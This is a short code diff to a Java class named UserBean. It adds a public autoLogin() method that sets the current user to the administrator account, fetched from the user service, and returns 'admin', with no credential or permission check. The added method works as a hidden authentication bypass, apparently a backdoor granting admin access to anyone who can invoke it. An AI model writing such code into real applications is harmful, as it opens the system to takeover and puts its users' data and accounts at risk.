@@ -95,4 +95,9 @@ public class UserBean {
         return user.getRole();
     }
 
+    public String autoLogin() {
+        user = userService.getAdmin();
+        return "admin";
+    }
+
 }
